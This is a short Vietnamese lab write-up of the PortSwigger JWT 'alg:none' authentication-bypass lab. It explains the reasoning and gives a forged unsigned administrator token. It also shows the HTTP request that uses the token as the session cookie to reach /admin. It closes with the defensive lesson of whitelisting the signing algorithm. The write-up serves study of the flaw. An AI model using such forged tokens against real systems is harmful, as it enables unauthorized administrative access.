![[jwt-none.png]]
-mô tả lab: server verify chữ ký rất ẩu, chấp nhận token không có signature (`alg:none`). Mình sửa role rồi xóa signature là vào admin.

> [!NOTE]
> -test bằng `wiener:peter`. Lab: https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-flawed-signature-verification

### hướng giải
- [ ] mình login `wiener:peter`, decode JWT ra thấy header `{"alg":"RS256",...}`, payload `{"sub":"wiener",...}`
- [ ] mình thử sửa `sub` thành `administrator` giữ nguyên signature rồi gửi lại, mình thấy bị từ chối -> server có check chữ ký thật
- [ ] nhưng mình thử đổi `alg` thành `none` + xóa signature, sau đó quan sát gói tin trả về, mình thấy nó cho qua
- [ ] => server tin vào `alg` trong header mà không whitelist. Gặp `none` là nó skip verify luôn

### giải
-bước 1: mình tạo token mới bằng JWT Editor (hoặc tay):
- header: `{"alg":"none"}`
- payload: `{"iss":"portswigger","sub":"administrator","exp":9999999999}`
- signature: rỗng
```
TOKEN = base64(header) + "." + base64(payload) + "."
vd: eyJhbGciOiJub25lIn0.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6ImFkbWluaXN0cmF0b3IifQ.
```
![[jwt-none-token.png]]
-lưu ý dấu chấm cuối (phần signature rỗng) phải giữ lại, nhiều server parse split(".") mà thiếu là lỗi format.

-bước 2: mình thay cookie rồi vào admin:
```
GET /admin
Cookie: session=eyJhbGciOiJub25lIn0.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6ImFkbWluaXN0cmF0b3IifQ.
-> 200 admin panel, xóa carlos là solve
```

> [!NOTE]
> -bài học của mình: server phải whitelist đúng 1 alg mình dùng, gặp `none` là đá. Lỗi này cổ nhưng vẫn gặp ở lib cũ/config ẩu.
